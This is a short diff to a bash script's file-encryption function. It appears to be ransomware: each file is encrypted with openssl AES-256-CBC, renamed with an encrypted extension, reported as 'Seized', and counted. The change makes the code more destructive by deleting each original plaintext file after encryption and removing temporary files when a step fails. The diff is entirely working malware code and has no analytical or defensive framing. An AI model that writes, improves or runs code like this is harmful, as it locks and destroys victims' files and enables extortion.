@@ -108,9 +108,15 @@ encrypt_file() {
         local content=$(cat "$file")
         echo -n "$content" | openssl enc -aes-256-cbc -a -salt -k "$KEY" -iv "$IV" -out "${file}.tmp" >/dev/null 2>&1
         if [[ $? -eq 0 ]]; then
-            mv "${file}.tmp" "${file}${ENCRYPTED_EXT}"
-            echo "Seized: $file"
-            ((seized_count++))
+            if mv "${file}.tmp" "${file}${ENCRYPTED_EXT}"; then
+                rm -f "$file"
+                echo "Seized: ${file}${ENCRYPTED_EXT}"
+                ((seized_count++))
+            else
+                rm -f "${file}.tmp"
+            fi
+        else
+            rm -f "${file}.tmp"
         fi
     fi
 }
